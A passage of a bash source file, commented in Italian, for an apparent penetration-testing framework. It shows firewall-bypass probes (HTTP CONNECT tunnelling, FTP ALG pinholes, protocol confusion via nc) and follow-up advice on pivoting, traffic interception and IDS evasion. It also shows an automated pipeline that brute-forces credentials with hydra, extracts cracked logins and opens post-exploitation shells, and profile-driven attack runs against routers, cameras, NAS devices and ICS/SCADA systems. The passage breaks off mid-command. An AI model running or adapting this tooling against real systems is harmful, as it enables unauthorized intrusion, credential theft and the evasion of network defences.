                              found CRITICAL "FW — FTP ALG pinhole CONFERMATO: porta $probe_port RAGGIUNGIBILE"; } || true
                    fi
                fi
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} FTP ALG PORT command test → $target:21 (probe port $probe_port)"
        fi
    fi

    # ── 15. HTTP CONNECT proxy tunnel ────────────────────────
    if [[ $do_http_tunnel -eq 1 ]]; then
        section "HTTP CONNECT Proxy Tunnel"
        if [[ $DRY_RUN -eq 0 ]]; then
            local http_ports_probe=(80 443 3128 8080 8443 8888)
            for hp in "${http_ports_probe[@]}"; do
                check_port "$target" "$hp" || continue
                log "Test HTTP CONNECT via $target:$hp ..."
                # Tenta di tunnelizzare verso 127.0.0.1:$probe_port tramite CONNECT
                local connect_resp
                connect_resp=$(printf 'CONNECT 127.0.0.1:%s HTTP/1.0\r\nHost: 127.0.0.1:%s\r\n\r\n' \
                    "$probe_port" "$probe_port" | \
                    nc -w 5 "$target" "$hp" 2>/dev/null | head -3 || true)
                echo "CONNECT via $hp: $connect_resp" >> "$OUTDIR/fw_http_tunnel.txt"
                if echo "$connect_resp" | grep -q "200 "; then
                    _fw_found "$probe_port" "HTTP CONNECT tunnel via $target:$hp"
                    found CRITICAL "FW — HTTP CONNECT proxy attivo su porta $hp: tunnel verso interna possibile"
                elif echo "$connect_resp" | grep -qiE "HTTP/[0-9]"; then
                    found INFO "FW — HTTP $hp risponde a CONNECT (risposta: $(echo "$connect_resp" | head -1))"
                fi
            done
        else
            echo -e "${CYAN}[DRY-RUN]${NC} HTTP CONNECT tunnel probe → $target (porte 80,443,8080...)"
        fi
    fi

    # ── 16. Protocol confusion ────────────────────────────────
    if [[ $do_proto_confuse -eq 1 ]]; then
        section "Protocol Confusion (SSH su 443, SIP su 80, HTTP su 22)"
        if [[ $DRY_RUN -eq 0 ]]; then
            # SSH banner su porta 443 (alcuni device espongono SSH su HTTPS)
            if check_port "$target" 443; then
                local ssh443
                ssh443=$(nc -w 4 "$target" 443 </dev/null 2>/dev/null | head -1 | tr -d '\r\n' || true)
                echo "443 banner: $ssh443" >> "$OUTDIR/fw_proto_confuse.txt"
                if echo "$ssh443" | grep -qi "^SSH"; then
                    found HIGH "PROTO — SSH su porta 443 (bypass HTTPS firewall filter)"
                elif echo "$ssh443" | grep -qi "^SIP\|SIP/2.0"; then
                    found HIGH "PROTO — SIP su porta 443"
                fi
            fi
            # SIP su porta 80
            if check_port "$target" 80; then
                local sip80_resp
                sip80_resp=$(printf 'OPTIONS sip:%s SIP/2.0\r\nVia: SIP/2.0/UDP %s:5060\r\nFrom: <sip:p@%s>\r\nTo: <sip:%s>\r\nCall-ID: pc80@%s\r\nCSeq: 1 OPTIONS\r\nContent-Length: 0\r\n\r\n' \
                    "$target" "127.0.0.1" "127.0.0.1" "$target" "127.0.0.1" | \
                    nc -w 4 "$target" 80 2>/dev/null | head -3 || true)
                echo "80 SIP probe: $sip80_resp" >> "$OUTDIR/fw_proto_confuse.txt"
                if echo "$sip80_resp" | grep -qi "SIP/2.0"; then
                    found HIGH "PROTO — SIP risponde su porta 80 (porta HTTP)"
                fi
            fi
            # HTTP probe su porta 22 (rarissimo ma possibile su embedded)
            if check_port "$target" 22; then
                local http22
                http22=$(printf 'GET / HTTP/1.0\r\nHost: %s\r\n\r\n' "$target" | \
                    nc -w 4 "$target" 22 2>/dev/null | head -1 | tr -d '\r\n' || true)
                echo "22 HTTP probe: $http22" >> "$OUTDIR/fw_proto_confuse.txt"
                if echo "$http22" | grep -qi "^HTTP"; then
                    found HIGH "PROTO — HTTP su porta 22 (non SSH standard)"
                elif echo "$http22" | grep -qi "^SSH"; then
                    log "Porta 22: SSH standard confermato"
                fi
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} Protocol confusion probe → $target (SSH/SIP/HTTP su porte non standard)"
        fi
    fi

    # ── 17. Matrix + Summary bypass ──────────────────────────
    section "Bypass Matrix & Summary"
    if [[ $DRY_RUN -eq 0 ]]; then
        # Costruisci matrice porta × tecnica
        if [[ -s "$bypass_log" ]]; then
            # Raccogli porte uniche e tecniche
            local all_ports=() all_techs=()
            while IFS='|' read -r port tech; do
                local p_trim="${port// /}" t_trim="${tech// /}"
                # Aggiungi porta se non presente
                local found_p=0
                for px in "${all_ports[@]:-}"; do [[ "$px" == "$p_trim" ]] && found_p=1; done
                [[ $found_p -eq 0 ]] && all_ports+=("$p_trim")
                # Aggiungi tecnica se non presente
                local found_t=0
                for tx in "${all_techs[@]:-}"; do [[ "$tx" == "$t_trim" ]] && found_t=1; done
                [[ $found_t -eq 0 ]] && all_techs+=("$t_trim")
            done < "$bypass_log"

            echo ""
            echo -e "${BOLD}${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
            echo -e "${BOLD}${RED}║           FIREWALL BYPASS — RISULTATI                        ║${NC}"
            echo -e "${BOLD}${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
            echo ""
            echo -e "${BOLD}MATRICE PORTA × TECNICA:${NC}"
            printf "  %-10s %-45s\n" "PORTA" "TECNICA"
            echo "  ──────────────────────────────────────────────────────────"
            while IFS='|' read -r port tech; do
                printf "  ${RED}%-10s${NC} ${YELLOW}%s${NC}\n" "${port// /}" "${tech// /}"
            done < "$bypass_log"
            echo "  ──────────────────────────────────────────────────────────"
            local total_bypass; total_bypass=$(wc -l < "$bypass_log" 2>/dev/null || echo 0)
            echo -e "  ${BOLD}Totale bypass confermati: ${RED}${total_bypass}${NC}"
            echo ""

            # Auto-suggest: suggerimenti follow-up basati sui bypass trovati
            echo -e "${BOLD}SUGGERIMENTI FOLLOW-UP:${NC}"
            local suggested=0
            while IFS='|' read -r port tech; do
                local p_trim="${port// /}" t_trim="${tech// /}"
                case "$t_trim" in
                    *"source-port"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim bypass via source-port: usa nmap -sV --source-port <trusted> per enumeration completa"
                        echo -e "  ${CYAN}→${NC} Verifica se altri servizi sono accessibili con source-port spoofing"
                        suggested=$((suggested+1))
                        ;;
                    *"FIN scan"*|*"NULL scan"*|*"XMAS scan"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim bypass via scan alternativo: il target probabilmente usa SYN-only firewall"
                        echo -e "  ${CYAN}→${NC} Prova: nmap -sF/$t_trim -sV per identificare il servizio"
                        suggested=$((suggested+1))
                        ;;
                    *"IPv6"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim aperta su IPv6: accedi direttamente via IPv6 con: exa-dune scan <ipv6_addr>"
                        echo -e "  ${CYAN}→${NC} Considera audit completo IPv6: molti device embedded non hanno regole IPv6"
                        suggested=$((suggested+1))
                        ;;
                    *"UPnP"*)
                        echo -e "  ${CYAN}→${NC} UPnP punch-through funziona: aggiungi mapping permanente per accesso remoto"
                        echo -e "  ${CYAN}→${NC} Esegui: exa-dune upnp $target per audit completo UPnP"
                        suggested=$((suggested+1))
                        ;;
                    *"SIP ALG"*)
                        echo -e "  ${CYAN}→${NC} SIP ALG crea pinhole: usa exa-dune sip $target per audit SIP completo"
                        echo -e "  ${CYAN}→${NC} Considera intercettazione traffico RTP tramite il pinhole"
                        suggested=$((suggested+1))
                        ;;
                    *"IP fragmentation"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim bypass via frammentazione: usa nmap -sV -f per service detection"
                        suggested=$((suggested+1))
                        ;;
                    *"HTTP CONNECT"*)
                        echo -e "  ${CYAN}→${NC} Proxy HTTP CONNECT attivo: usa come pivot per accedere a host interni"
                        echo -e "  ${CYAN}→${NC} Configura proxychains con http proxy $target:<porta>"
                        suggested=$((suggested+1))
                        ;;
                    *"TTL"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim bypass via TTL: il firewall filtra per TTL (hop count detection)"
                        suggested=$((suggested+1))
                        ;;
                    *"FTP ALG"*)
                        echo -e "  ${CYAN}→${NC} FTP ALG attivo: usa exa-dune ftp $target per full FTP audit"
                        echo -e "  ${CYAN}→${NC} FTP PORT può aprire porte arbitrarie — considera exploitation data channel"
                        suggested=$((suggested+1))
                        ;;
                    *"decoy"*)
                        echo -e "  ${CYAN}→${NC} Decoy scan effettivo: usa -D con IP specifici dell'infrastruttura per evasione IDS avanzata"
                        suggested=$((suggested+1))
                        ;;
                    *"data-length"*)
                        echo -e "  ${CYAN}→${NC} Padding bypass su porta $p_trim: IDS potrebbe avere limite su dimensione pacchetto"
                        suggested=$((suggested+1))
                        ;;
                    *"rate evasion"*)
                        echo -e "  ${CYAN}→${NC} Porta $p_trim visibile solo con scan lento: IDS con rate-limiting attivo"
                        echo -e "  ${CYAN}→${NC} Usa -T1 o --scan-delay per tutti i scan futuri su questo target"
                        suggested=$((suggested+1))
                        ;;
                esac
            done < "$bypass_log"
            [[ $suggested -eq 0 ]] && echo -e "  ${CYAN}→${NC} Bypass trovati ma nessun suggerimento specifico — analisi manuale consigliata"
            echo ""

            # Salva summary nel file globale
            {
                echo ""
                echo "=== FIREWALL BYPASS TROVATI ($total_bypass) ==="
                cat "$bypass_log"
            } >> "$OUTDIR/../findings.txt" 2>/dev/null || true
        else
            ok "Nessun bypass confermato — firewall sembra robusto su tutte le tecniche testate"
        fi
        [[ -f "$OUTDIR/fw_summary.txt" ]] && \
            cat "$OUTDIR/fw_summary.txt" >> "$OUTDIR/../findings.txt" 2>/dev/null || true
    fi

    ok "Firewall analysis completata → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: pipeline  — Scan → Suggest → Attack → Post → PDF
# ============================================================
usage_pipeline() {
    echo "Uso: exa-dune pipeline <TARGET> [OPTIONS]"
    echo ""
    echo "  Pipeline intelligente: scan → analisi → attacchi automatici → post-exploitation → report PDF"
    echo ""
    echo "Opzioni:"
    echo "  --from-scan DIR    Usa scan esistente (salta fase scan)"
    echo "  --auto             Esegui senza chiedere conferma"
    echo "  --no-post          Salta post-exploitation automatico"
    echo "  --parallel         Esegui moduli in parallelo (background jobs)"
    echo "  --stealth          Passa --stealth a tutti i moduli"
    echo "  --timeout N        Timeout minuti per modulo (default: 10)"
    echo "  --userlist FILE"
    echo "  --passlist FILE"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_pipeline() {
    local target="" from_scan="" auto_mode=0 no_post=0 parallel_mode=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --from-scan)  from_scan="$2";      shift 2 ;;
            --auto)       auto_mode=1;         shift ;;
            --no-post)    no_post=1;           shift ;;
            --parallel)   parallel_mode=1;     shift ;;
            --stealth)    STEALTH=1;           shift ;;
            --timeout)    TIMEOUT="$2";        shift 2 ;;
            --userlist)   CUSTOM_USERS="$2";   shift 2 ;;
            --passlist)   CUSTOM_PASS="$2";    shift 2 ;;
            --output)     OUTDIR_BASE="$2";    shift 2 ;;
            --dry-run)    DRY_RUN=1;           shift ;;
            --help|-h)    usage_pipeline; exit 0 ;;
            -*)           err "Opzione sconosciuta: $1"; usage_pipeline; exit 1 ;;
            *)            target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_pipeline; exit 1; }
    validate_target "$target"
    check_root
    apply_stealth

    local base_ts; base_ts=$(date +%Y%m%d_%H%M%S)
    OUTDIR_BASE="${OUTDIR_BASE:-/root/pentest/exa-dune-${target//./-}_${base_ts}}"
    [[ $DRY_RUN -eq 0 ]] && mkdir -p "$OUTDIR_BASE"
    _log_file="${OUTDIR_BASE}/pipeline.log"
    [[ $DRY_RUN -eq 1 ]] && _log_file=""
    local _timeline_file="${OUTDIR_BASE}/timeline.txt"
    [[ $DRY_RUN -eq 0 ]] && : > "$_timeline_file"

    _timeline_event() {
        [[ $DRY_RUN -eq 1 ]] && return
        printf "[%s] %s\n" "$(date '+%H:%M:%S')" "$*" >> "$_timeline_file" 2>/dev/null || true
    }

    banner
    log "=== PIPELINE START === Target: $target | Output: $OUTDIR_BASE"
    _timeline_event "PIPELINE START — target=$target parallel=${parallel_mode}"

    # ── FASE 1: SCAN ─────────────────────────────────────────
    local scan_dir=""
    if [[ -n "$from_scan" && -d "$from_scan" ]]; then
        scan_dir="$from_scan"
        ok "Fase 1 SCAN: uso scan esistente → $scan_dir"
        _timeline_event "FASE 1 — SCAN (preesistente): $scan_dir"
    else
        section "FASE 1 — PORT SCAN"
        _timeline_event "FASE 1 START — port scan su $target"
        local extra_flags="--output $OUTDIR_BASE"
        [[ $STEALTH -eq 1 ]] && extra_flags="$extra_flags --stealth"
        [[ $DRY_RUN -eq 1 ]] && extra_flags="$extra_flags --dry-run"
        [[ "${TIMEOUT:-0}" -gt 0 ]] && extra_flags="$extra_flags --timeout $TIMEOUT"
        bash "$SCRIPT_PATH" scan "$target" --vuln $extra_flags || true
        scan_dir="$OUTDIR_BASE"
        _timeline_event "FASE 1 END — scan completato"
    fi

    # ── FASE 2: ANALISI E SUGGEST ────────────────────────────
    section "FASE 2 — ANALISI SCAN E SUGGERIMENTI"
    _timeline_event "FASE 2 START — analisi risultati scan"
    local nmap_out
    nmap_out=$(find "$scan_dir" -name "nmap_fast.nmap" -o -name "nmap_fast.gnmap" 2>/dev/null | head -1) || true

    if [[ -z "$nmap_out" && $DRY_RUN -eq 0 ]]; then
        warn "File nmap non trovato in $scan_dir — pipeline interrotta"
        exit 1
    fi

    local attack_plan=()
    if [[ -n "$nmap_out" ]]; then
        while IFS= read -r line; do
            attack_plan+=("$line")
        done < <(_suggest_attacks "$nmap_out" "$target")
    fi

    if [[ ${#attack_plan[@]} -eq 0 ]]; then
        if [[ $DRY_RUN -eq 1 ]]; then
            # In dry-run senza nmap file: popola con piano demo per mostrare tutte le fasi
            attack_plan=(
                "1|sip|$target|SIP esposto: enumerazione estensioni e crack PIN"
                "5|ssh|$target|SSH: brute force credenziali"
                "8|web|$target|HTTP: directory fuzzing e nikto"
                "9|snmp|$target|SNMP: community brute force"
            )
            log "[DRY-RUN] Nessun file nmap trovato — uso piano attacchi demo per simulazione"
        else
            warn "Nessuna porta riconosciuta — pipeline interrotta dopo scan"
            bash "$SCRIPT_PATH" report "$OUTDIR_BASE" --html --pdf --output "$OUTDIR_BASE" 2>/dev/null || true
            exit 0
        fi
    fi

    _print_suggestions "$nmap_out" "$target"
    _timeline_event "FASE 2 END — ${#attack_plan[@]} attacchi pianificati"

    # ── CONFERMA O AUTO ──────────────────────────────────────
    if [[ $auto_mode -eq 0 && $DRY_RUN -eq 0 ]]; then
        echo ""
        read -r -p "$(echo -e "${YELLOW}[?]${NC} Procedere con gli attacchi suggeriti? [S/n] ")" ans || ans="s"
        [[ "${ans,,}" == "n" ]] && { warn "Pipeline interrotta dall'utente."; exit 0; }
    fi

    # ── FASE 3: ESECUZIONE ATTACCHI ─────────────────────────
    section "FASE 3 — ESECUZIONE ATTACCHI"
    _timeline_event "FASE 3 START — esecuzione ${#attack_plan[@]} moduli (parallel=${parallel_mode})"
    local found_creds=0
    local modules_run=()
    local _bg_pids=()

    # Helper per eseguire un modulo (sequenziale o background)
    _run_module() {
        local module="$1"; shift
        local args="$*"
        local mod_flags="--output $OUTDIR_BASE"
        [[ $STEALTH -eq 1 ]] && mod_flags="$mod_flags --stealth"
        [[ $DRY_RUN -eq 1 ]] && mod_flags="$mod_flags --dry-run"
        [[ "${TIMEOUT:-0}" -gt 0 ]] && mod_flags="$mod_flags --timeout $TIMEOUT"
        [[ -n "$CUSTOM_USERS" ]] && mod_flags="$mod_flags --userlist $CUSTOM_USERS"
        [[ -n "$CUSTOM_PASS"  ]] && mod_flags="$mod_flags --passlist $CUSTOM_PASS"
        _timeline_event "  MOD START — $module $args"
        local t0; t0=$(date +%s)
        bash "$SCRIPT_PATH" $module $args $mod_flags 2>&1 || true
        local t1; t1=$(date +%s)
        _timeline_event "  MOD END   — $module [$(( t1 - t0 ))s]"
    }

    if [[ $parallel_mode -eq 1 && $DRY_RUN -eq 0 ]]; then
        # Modalità parallela: lancia tutti in background, poi aspetta
        log "[PARALLEL] Lancio tutti i moduli in background..."
        for entry in "${attack_plan[@]}"; do
            IFS='|' read -r prio module args reason <<< "$entry"
            log "  [bg] $module — $reason"
            modules_run+=("$module")
            _run_module "$module" $args &
            _bg_pids+=($!)
        done
        log "[PARALLEL] In attesa completamento ${#_bg_pids[@]} moduli..."
        for pid in "${_bg_pids[@]}"; do
            wait "$pid" 2>/dev/null || true
        done
        ok "[PARALLEL] Tutti i moduli completati."
    else
        # Modalità sequenziale (default)
        for entry in "${attack_plan[@]}"; do
            IFS='|' read -r prio module args reason <<< "$entry"
            section "  [$module] $reason"
            log "Esecuzione: exa-dune $module $args"
            modules_run+=("$module")
            _run_module "$module" $args

            # Controlla se sono state trovate credenziali dopo ogni modulo
            if [[ $DRY_RUN -eq 0 ]] && \
               find "$OUTDIR_BASE" -name "hydra_*.txt" -newer "$OUTDIR_BASE/pipeline.log" \
                    -exec grep -l "login:" {} \; 2>/dev/null | grep -q .; then
                found_creds=1
                ok "Credenziali trovate durante modulo '$module'!"
            fi

            # Fine fase — messaggio se nulla trovato
            if [[ $DRY_RUN -eq 0 ]]; then
                local mod_findings
                mod_findings=$(find "$OUTDIR_BASE" -path "*/${module}*/findings.txt" 2>/dev/null | head -1)
                if [[ -n "$mod_findings" && -s "$mod_findings" ]]; then
                    local count; count=$(wc -l < "$mod_findings" 2>/dev/null || echo 0)
                    ok "[$module] $count finding(s) registrati"
                else
                    log "[$module] Nessuna vulnerabilità rilevata — fase completata."
                fi
            fi
        done
    fi

    # Check credenziali dopo tutto (in parallel mode controlliamo qui)
    if [[ $DRY_RUN -eq 0 ]] && find "$OUTDIR_BASE" -name "hydra_*.txt" \
         -exec grep -l "login:" {} \; 2>/dev/null | grep -q .; then
        found_creds=1
    fi
    _timeline_event "FASE 3 END — found_creds=${found_creds}"

    # ── FASE 4: POST-EXPLOITATION ────────────────────────────
    if [[ $no_post -eq 0 && $found_creds -eq 1 ]]; then
        section "FASE 4 — POST-EXPLOITATION (credenziali trovate)"
        _timeline_event "FASE 4 START — post-exploitation"
        # Leggi le credenziali trovate da hydra
        while IFS= read -r -d '' hfile; do
            local cred_user cred_pass cred_port
            cred_user=$(grep "login:" "$hfile" 2>/dev/null | head -1 | grep -oP "login: \K\S+")
            cred_pass=$(grep "login:" "$hfile" 2>/dev/null | head -1 | grep -oP "password: \K\S+")
            cred_port=$(grep "login:" "$hfile" 2>/dev/null | head -1 | grep -oP "port \K[0-9]+" || echo "22")
            local proto="ssh"
            echo "$hfile" | grep -qi "ftp"    && proto="ftp"
            echo "$hfile" | grep -qi "telnet" && proto="telnet"
            echo "$hfile" | grep -qi "smb"    && proto="smb"

            if [[ -n "$cred_user" && -n "$cred_pass" ]]; then
                log "Post-exploit via $proto: $cred_user:$cred_pass"
                local post_flags="--output $OUTDIR_BASE"
                [[ $DRY_RUN -eq 1 ]] && post_flags="$post_flags --dry-run"
                bash "$SCRIPT_PATH" post "$target" shell \
                    --proto "$proto" --user "$cred_user" --pass "$cred_pass" \
                    --port "$cred_port" $post_flags 2>&1 || true
            fi
        done < <(find "$OUTDIR_BASE" -name "hydra_*.txt" -print0 2>/dev/null)
    elif [[ $no_post -eq 0 && $found_creds -eq 0 && $DRY_RUN -eq 0 ]]; then
        log "Fase 4 POST-EXPLOITATION: nessuna credenziale confermata — step saltato."
        _timeline_event "FASE 4 SKIP — nessuna credenziale"
    fi

    # ── FASE 5: REPORT PDF ───────────────────────────────────
    section "FASE 5 — GENERAZIONE REPORT PDF"
    _timeline_event "FASE 5 START — generazione report"
    local report_flags="--html --pdf"
    [[ $DRY_RUN -eq 1 ]] && report_flags="$report_flags --dry-run"
    bash "$SCRIPT_PATH" report "$OUTDIR_BASE" $report_flags 2>&1 || true
    _timeline_event "FASE 5 END — pipeline completata"

    echo ""
    local total_findings; total_findings=$(find "$OUTDIR_BASE" -name 'findings.txt' -exec wc -l {} \; 2>/dev/null | awk '{s+=$1} END{print s+0}')
    local total_creds; total_creds=$(find "$OUTDIR_BASE" -name "hydra_*.txt" -exec grep -c "login:" {} \; 2>/dev/null | awk '{s+=$1} END{print s+0}' || echo 0)
    ok "=== PIPELINE COMPLETATA === Output: $OUTDIR_BASE"
    echo -e "  ${BOLD}Report:${NC}     $OUTDIR_BASE/REPORT_*.pdf"
    echo -e "  ${BOLD}Findings:${NC}   $total_findings totali"
    echo -e "  ${BOLD}Credenziali:${NC} $total_creds trovate"
    echo -e "  ${BOLD}Timeline:${NC}   $OUTDIR_BASE/timeline.txt"
    [[ -f "$_timeline_file" ]] && { echo ""; echo "── Timeline ──"; cat "$_timeline_file"; }
}

# ============================================================
#  SUBCOMMAND: auto
# ============================================================
usage_auto() {
    echo "Uso: exa-dune auto <TARGET> [OPTIONS]"
    echo ""
    echo "  Full assessment orchestrato via tmux"
    echo "  Auto-rileva il tipo di device e lancia i moduli pertinenti"
    echo ""
    echo "Profili:"
    echo "  voip     — SIP/VoIP (Web + SIP + SNMP + TFTP)"
    echo "  camera   — IP Camera (Web + RTSP)"
    echo "  router   — Router/Firewall (Web + SSH + SNMP + DNS)"
    echo "  nas      — NAS (Web + SMB + SSH + NFS)"
    echo "  printer  — Stampante (Web + SNMP + IPP + PJL)"
    echo "  switch   — Switch gestito (Web + SSH + Telnet + SNMP)"
    echo "  ics      — ICS/SCADA (Modbus + BACnet + EtherNet/IP)"
    echo "  generic  — Full (tutti i moduli)"
    echo ""
    echo "Opzioni:"
    echo "  --profile PROFILE"
    echo "  --stealth"
    echo "  --no-tmux          Esecuzione sequenziale (senza tmux)"
    echo "  --timeout N        Timeout minuti per modulo"
    echo "  --userlist FILE"
    echo "  --passlist FILE"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_auto() {
    local target="" profile="generic" no_tmux=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --profile)   profile="$2";        shift 2 ;;
            --stealth)   STEALTH=1;           shift ;;
            --no-tmux)   no_tmux=1;           shift ;;
            --timeout)   TIMEOUT="$2";        shift 2 ;;
            --userlist)  CUSTOM_USERS="$2";   shift 2 ;;
            --passlist)  CUSTOM_PASS="$2";    shift 2 ;;
            --output)    OUTDIR_BASE="$2";    shift 2 ;;
            --dry-run)   DRY_RUN=1;           shift ;;
            --help|-h)   usage_auto; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_auto; exit 1 ;;
            *)           target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_auto; exit 1; }
    validate_target "$target"
    check_root
    apply_stealth

    local base_ts; base_ts=$(date +%Y%m%d_%H%M%S)
    OUTDIR_BASE="${OUTDIR_BASE:-/root/pentest/exa-dune-${target//./-}_${base_ts}}"
    [[ $DRY_RUN -eq 0 ]] && mkdir -p "$OUTDIR_BASE"
    OUTDIR="$OUTDIR_BASE"
    [[ $DRY_RUN -eq 0 ]] && _log_file="$OUTDIR_BASE/master.log" || _log_file=""
    log "Target: $target | Profilo: $profile | Output: $OUTDIR_BASE"

    # Auto-detect profilo se generic
    if [[ "$profile" == "generic" ]]; then
        log "Quick scan per auto-detection profilo (timeout 120s)..."
        local quick_out="$OUTDIR_BASE/quick_detect.gnmap"
        if [[ $DRY_RUN -eq 0 ]]; then
            timeout 120 nmap -p 22,23,25,69,80,139,443,445,502,554,631,1883,2049,2404,\
5000,5001,5060,5061,8080,8291,8443,8554,9100,44818,47808 \
                --open -oG "$quick_out" $NMAP_TIMING "$target" 2>/dev/null || true

            if [[ ! -f "$quick_out" ]] || ! grep -q "Ports:" "$quick_out" 2>/dev/null; then
                warn "Quick scan fallito o timeout — tentativo banner-based detection"
                local banner_profile="generic"
                # Prova porte caratteristiche via nc
                nc -z -w 2 "$target" 5060 2>/dev/null && banner_profile="voip"
                [[ "$banner_profile" == "generic" ]] && \
                    nc -z -w 2 "$target" 445  2>/dev/null && banner_profile="nas"
                [[ "$banner_profile" == "generic" ]] && \
                    nc -z -w 2 "$target" 554  2>/dev/null && banner_profile="camera"
                [[ "$banner_profile" == "generic" ]] && \
                    nc -z -w 2 "$target" 502  2>/dev/null && banner_profile="ics"
                [[ "$banner_profile" == "generic" ]] && \
                    nc -z -w 2 "$target" 1883 2>/dev/null && banner_profile="ics"
                if [[ "$banner_profile" != "generic" ]]; then
                    warn "Banner detection: profilo suggerito → $banner_profile"
                    read -r -p "$(echo -e "${YELLOW}[?]${NC} Usare profilo '$banner_profile'? [S/n] ")" ans || ans=""
                    [[ "${ans,,}" != "n" ]] && profile="$banner_profile"
                else
                    warn "Nessun profilo rilevato — uso generic"
                fi
            else
                local open_ports
                open_ports=$(grep "Ports:" "$quick_out" | grep -oP '[0-9]+/open' | tr '\n' ' ' || true)
                local suggested="generic"
                echo "$open_ports" | grep -qE "9100|631"       && suggested="printer"
                echo "$open_ports" | grep -q  "8291"            && suggested="router"
                echo "$open_ports" | grep -qE "5000|5001|2049"  && suggested="nas"
                echo "$open_ports" | grep -qE "502|44818|47808" && suggested="ics"
                echo "$open_ports" | grep -qE "5060|5061"       && suggested="voip"
                echo "$open_ports" | grep -qE "139|445"         && [[ "$suggested" == "generic" ]] && suggested="nas"
                echo "$open_ports" | grep -qE "554|8554"        && [[ "$suggested" == "generic" ]] && suggested="camera"
                if [[ "$suggested" != "generic" ]]; then
                    warn "Profilo rilevato automaticamente: $suggested"
                    read -r -p "$(echo -e "${YELLOW}[?]${NC} Usare profilo '$suggested'? [S/n] ")" ans || ans=""
                    [[ "${ans,,}" != "n" ]] && profile="$suggested"
                fi
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} Quick scan per auto-detection su $target"
        fi
    fi

    local session="exa-dune_${target//./_}"
    if [[ $no_tmux -eq 0 && $DRY_RUN -eq 0 ]]; then
        tmux kill-session -t "$session" 2>/dev/null || true
        tmux new-session -d -s "$session" -x 220 -y 50
        _ACTIVE_TMUX_SESSION="$session"
    fi

    # Helper per lanciare subcommand in tmux
    _auto_mod() {
        local win="$1"; shift
        local extra_flags=""
        [[ $DRY_RUN -eq 1 ]] && extra_flags="--dry-run"
        [[ $STEALTH -eq 1 ]] && extra_flags="$extra_flags --stealth"
        [[ "${TIMEOUT:-0}" -gt 0 ]] && extra_flags="$extra_flags --timeout $TIMEOUT"
        [[ -n "$CUSTOM_USERS" ]] && extra_flags="$extra_flags --userlist $CUSTOM_USERS"
        [[ -n "$CUSTOM_PASS"  ]] && extra_flags="$extra_flags --passlist $CUSTOM_PASS"
        if [[ $no_tmux -eq 1 ]]; then
            log "[seq] $win: exa-dune $* $extra_flags --output $OUTDIR_BASE"
            [[ $DRY_RUN -eq 0 ]] && exa-dune "$@" $extra_flags --output "$OUTDIR_BASE" || true
            return
        fi
        run_in_tmux "$session" "$win" \
            "exa-dune $* $extra_flags --output $OUTDIR_BASE; echo '[DONE] $win'"
    }

    log "Profilo: $profile"

    # Scan sempre incluso
    _auto_mod "scan"    scan    "$target"

    case "$profile" in
        voip)
            _auto_mod "web_80"  web     "$target" --port 80  --scheme http
            _auto_mod "web_443" web     "$target" --port 443 --scheme https
            _auto_mod "web_8080" web    "$target" --port 8080 --scheme http
            _auto_mod "sip"     sip     "$target"
            _auto_mod "snmp"    snmp    "$target"
            _auto_mod "ssl_443"  ssl    "$target"
            _auto_mod "tftp"     tftp   "$target"
            _auto_mod "rtsp"     rtsp   "$target"
            _auto_mod "fw"       fw     "$target" --tech "ack,altscans,srcport,frag,ipv6,upnp,sip-alg"
            _auto_mod "creds_http"  creds "$target" http
            _auto_mod "creds_https" creds "$target" https
            ;;
        camera)
            _auto_mod "web_80"    web   "$target" --port 80  --scheme http
            _auto_mod "web_443"   web   "$target" --port 443 --scheme https
            _auto_mod "web_8080"  web   "$target" --port 8080 --scheme http
            _auto_mod "rtsp"      rtsp  "$target"
            _auto_mod "ssl_443"   ssl   "$target"
            _auto_mod "onvif"     onvif "$target"
            _auto_mod "js"        js    "$target" --port 80
            _auto_mod "snmp"      snmp  "$target"
            _auto_mod "creds_80"  creds "$target" http --port 80
            _auto_mod "creds_443" creds "$target" https --port 443
            ;;
        router)
            _auto_mod "web_80"   web   "$target" --port 80   --scheme http
            _auto_mod "web_443"  web   "$target" --port 443  --scheme https
            _auto_mod "web_8080" web   "$target" --port 8080 --scheme http
            _auto_mod "ssh"      ssh   "$target"
            _auto_mod "snmp"     snmp  "$target"
            _auto_mod "fw"       fw    "$target"
            _auto_mod "upnp"     upnp  "$target"
            _auto_mod "creds_http"  creds "$target" http
            _auto_mod "creds_https" creds "$target" https
            run_in_tmux "$session" "dns" \
                "nmap -sU -p 53 --script dns-recursion,dns-cache-snoop $target \
                 -oA $OUTDIR_BASE/scan/dns 2>&1; echo '[DONE] dns'"
            ;;
        nas)
            _auto_mod "web_80"   web   "$target" --port 80   --scheme http
            _auto_mod "web_443"  web   "$target" --port 443  --scheme https
            _auto_mod "web_5000" web   "$target" --port 5000 --scheme http
            _auto_mod "web_5001" web   "$target" --port 5001 --scheme https
            _auto_mod "smb"      smb   "$target"
            _auto_mod "ssh"      ssh   "$target"
            _auto_mod "creds"    creds "$target" http --port 5000
            run_in_tmux "$session" "nfs" \
                "nmap -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs $target \
                 -oA $OUTDIR_BASE/scan/nfs 2>&1; echo '[DONE] nfs'"
            ;;
        printer)
            _auto_mod "web_80"  web   "$target" --port 80  --scheme http
            _auto_mod "web_443" web   "$target" --port 443 --scheme https
            _auto_mod "snmp"    snmp  "$target"
            _auto_mod "creds"   creds "$target" http --port 80
            run_in_tmux "$session" "ipp" \
                "nmap -p 631 --script ipp-printer-info $target \
                 -oA $OUTDIR_BASE/scan/ipp 2>&1; echo '[DONE] ipp'"
            run_in_tmux "$session" "pjl" \
                "nmap -p 9100 --script pjl-ready-message,banner $target \
